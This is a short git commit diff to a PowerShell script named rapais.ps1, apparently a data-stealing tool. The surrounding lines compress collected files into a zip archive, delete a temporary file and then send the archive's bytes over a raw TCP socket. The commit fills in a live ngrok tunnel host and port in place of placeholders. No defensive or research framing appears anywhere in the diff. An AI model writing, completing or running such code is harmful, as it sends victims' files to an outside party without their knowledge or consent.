f4c344074bec65428c0d05219c6aefdecbf83696
FBiUwU <71545021+FBIgLoK@users.noreply.github.com>
2026-01-24 17:32:39 +0100

    Update TCP connection details in rapais.ps1

--- rapais.ps1
+++ rapais.ps1
@@ -22,7 +22,7 @@ Compress-Archive `
 Remove-Item $tempFile -Force
 
 # Envia via TCP
-$c = New-Object Net.Sockets.TCPClient("( raw ).tcp.eu.ngrok.io", ( porta ))
+$c = New-Object Net.Sockets.TCPClient("2.tcp.eu.ngrok.io",13181)
 $s = $c.GetStream()
 $b = [IO.File]::ReadAllBytes($zip)
 $s.Write($b,0,$b.Length)
